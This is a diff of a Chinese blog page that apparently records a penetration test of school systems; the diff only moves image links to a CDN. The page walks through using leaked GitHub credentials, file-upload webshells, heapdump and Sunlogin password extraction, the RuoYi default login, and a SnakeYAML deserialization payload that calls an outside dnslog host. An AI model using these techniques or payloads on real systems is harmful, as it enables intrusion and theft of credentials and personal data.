-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1682047247100-56c5d98d-36f9-4214-91cb-57927f951202.png">
         
     </a></p>
 <h2 id="3github泄漏账号密码" class="headerLink">
     <a href="#3github%e6%b3%84%e6%bc%8f%e8%b4%a6%e5%8f%b7%e5%af%86%e7%a0%81" class="header-mark"></a>3、Github泄漏账号密码</h2><h2 id="账号密码" class="headerLink">
     <a href="#%e8%b4%a6%e5%8f%b7%e5%af%86%e7%a0%81" class="header-mark"></a>账号密码</h2><p>1、GitHub搜索&quot;学校域名&quot; &ldquo;password&rdquo; 发现邮箱账号密码</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666785686363-fae7d3ac-9e29-419f-bd6d-70943d8b73a5.png">
         
     </a></p>
 <p>2、登录邮箱发现手机号身份证号</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666785741007-bdfa235c-8d8b-454e-bbb3-3ee5a77cac0b.png">
         
     </a></p>
 <h2 id="统一门户" class="headerLink">
     <a href="#%e7%bb%9f%e4%b8%80%e9%97%a8%e6%88%b7" class="header-mark"></a>统一门户</h2><p>3、手机号加邮箱密码直接登录统一门户</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666785802512-960d2609-4353-4ca3-8392-05c411225430.png">
         
     </a></p>
 <h2 id="泛微oa" class="headerLink">
     <a href="#%e6%b3%9b%e5%be%aeoa" class="header-mark"></a>泛微OA</h2><p>跳转到泛微OA,文件上传GetShell</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666859543684-0e57d55f-cd23-4d71-9d9a-0af55d18a3ae.png">
         
     </a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666859616414-5b42bd67-e726-4139-b5d1-5a17e4947cad.png">
         
     </a></p>
 <h2 id="4向日葵密码读取" class="headerLink">
     <a href="#4%e5%90%91%e6%97%a5%e8%91%b5%e5%af%86%e7%a0%81%e8%af%bb%e5%8f%96" class="header-mark"></a>4、向日葵密码读取</h2><h2 id="heapdump文件泄漏" class="headerLink">
     <a href="#heapdump%e6%96%87%e4%bb%b6%e6%b3%84%e6%bc%8f" class="header-mark"></a>heapdump文件泄漏</h2><p>直接下载heapdump文件</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1669965016254-2a8dc75e-e316-4c9b-8d15-e728a48f81c0.png">
         
     </a></p>
 <p>读取到mssql账号密码</p>
 <h2 id="向日葵密码读取" class="headerLink">
     <a href="#%e5%90%91%e6%97%a5%e8%91%b5%e5%af%86%e7%a0%81%e8%af%bb%e5%8f%96" class="header-mark"></a>向日葵密码读取</h2><p>成功连接mssql服务器，执行xp_cmdshell</p>
 <p>C:\Program Files\Oray\SunLogin\SunloginClient\config.ini为向日葵的默认安装配置文件，直接尝试读取</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666853900835-5ec1b20f-016e-4a6c-a55a-28a74bd74eb3.png">
         
     </a></p>
 <p>fastcode将第一位字母去除就为本机识别码，encry_pwd为加密后的本机验证码</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666853988995-3f33daa3-57ff-4df3-824d-9cc02668ca63.png">
         
     </a></p>
 <p>可以使用GitHub解密项目<a href="https://github.com/wafinfo/Sunflower_get_Password" target="_blank" rel="noopener noreferrer">https://github.com/wafinfo/Sunflower_get_Password</a>进行解密。</p>
 <p>解密后成功连接目标主机服务器</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666924390310-caacba10-13f3-4314-8551-df3695934fc3.png">
         
     </a></p>
 <h2 id="5若依漏洞getshell" class="headerLink">
     <a href="#5%e8%8b%a5%e4%be%9d%e6%bc%8f%e6%b4%9egetshell" class="header-mark"></a>5、若依漏洞GetShell</h2><p>1、某学院首页</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666783594609-b9e91b72-5c7f-4525-99a9-0f7dd6715151.png">
         
     </a></p>
 <p>2、/login ，访问后台页面，发现为若依框架，admin/admin@123直接登录后台</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666783656707-9e4caf19-b3bf-4bdf-9b54-6621127d41b9.png">
         
     </a></p>
 <h2 id="定时任务命令执行" class="headerLink">
     <a href="#%e5%ae%9a%e6%97%b6%e4%bb%bb%e5%8a%a1%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="header-mark"></a>定时任务命令执行</h2><p>以管理员权限登录在定时任务处新增</p>
 <p>org.yaml.snakeyaml.Yaml.load(&rsquo;!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&ldquo;<a href="ftp://ceshi.bdtmos.dnslog.cn" target="_blank" rel="noopener noreferrer">ftp://ceshi.bdtmos.dnslog.cn</a>&rdquo;] ]] ]&rsquo;)运行任务</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666783386928-a952a760-b649-49e5-928e-58bf8be8fde8.png">
         
     </a>DNSlog平台收到请求</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666784422042-1fd16b50-a8ab-40a1-8982-29767d0196cd.png">
         
     </a></p>
 <h2 id="shiro-反序列化漏洞" class="headerLink">
     <a href="#shiro-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e" class="header-mark"></a>shiro 反序列化漏洞</h2><p>工具直接开扫，成功注入内存马</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666784020286-ef599266-4c4f-4393-a009-f8ec64b31fd7.png">
         
     </a></p>
 <p>连接内存马</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666784056566-1b072ea2-0745-489d-9db9-daea47defde0.png">
         
     </a></p>
 <p>发现历史入侵痕迹，发现fscan黑客漏扫工具</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666784102977-d2089344-c47b-475d-a856-60c48c7a33d9.png">
         
     </a></p>
 <h2 id="sql注入" class="headerLink">
@@ -208,88 +208,88 @@
 </div>
 </div><h2 id="6fckeditor上传文件getshell" class="headerLink">
     <a href="#6fckeditor%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6getshell" class="header-mark"></a>6、FCKeditor上传文件GetShell</h2><p>1、扫描目录发现存在FCKeditor目录</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png">
         
     </a></p>
 <p>2、直接找到上传目录</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png">
         
     </a></p>
 <p>3、上传aspx木马</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png">
         
     </a></p>
 <p>成功连接</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/教育行业渗透打点/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png">
         
     </a></p>
 <h2 id="7任意文件上传" class="headerLink">
     <a href="#7%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="header-mark"></a>7、任意文件上传</h2><p>根据学校名称及域名进行编排密码本，爆破登录admin账号</p>
